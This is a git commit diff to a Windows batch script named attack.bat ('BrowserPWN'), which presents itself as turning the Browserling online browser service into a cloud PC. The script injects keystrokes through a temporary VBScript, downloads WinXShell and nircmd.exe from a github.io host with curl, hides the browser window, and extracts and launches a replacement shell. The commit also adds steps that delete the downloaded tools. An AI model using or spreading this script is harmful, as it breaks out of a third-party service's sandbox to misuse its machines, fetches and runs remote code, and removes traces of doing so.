c0bb23b0f112916c4a66e86514120bfceea3b8ec
bfffggh <83696427+bfffggh@users.noreply.github.com>
2024-01-23 20:34:11 +0100

    Update attack.bat

--- attack.bat
+++ attack.bat
@@ -1,12 +1,16 @@
 @echo off
-title BrowserPWN
+echo CreateObject("Wscript.Shell").SendKeys("%~") >n.vbs & start /wait "" wscript n.vbs & del n.vbs
 color 1f
-echo ======== [BrowserPWN] ========
+echo ===================== [BrowserPWN] =====================
+echo ^| Turn Browserling into a Cloud PC service with ease!  ^|
+echo ========================================================
 cd /d "%userprofile%"
 echo Downloading WinXShell...
-curl https://bfffggh.github.io/bp1/WinXShell_x64.7z -o wx.7z >NUL
+curl https://bfffggh.github.io/bp1/WinXShell_x64.7z -o wx.7z 2>NUL
 echo Initializing session...
-curl https://bfffggh.github.io/bp1/nircmd.exe -o nc.exe >NUL
+curl https://bfffggh.github.io/bp1/nircmd.exe -o nc.exe 2>NUL
 nc win hide class Chrome_WidgetWin_1
+del nc.exe
 "%ProgramFiles%\7-zip\7z.exe" x wx.7z -owx >NUL
+del wx.7z
 start "" wx\winxshell\winxshell.exe
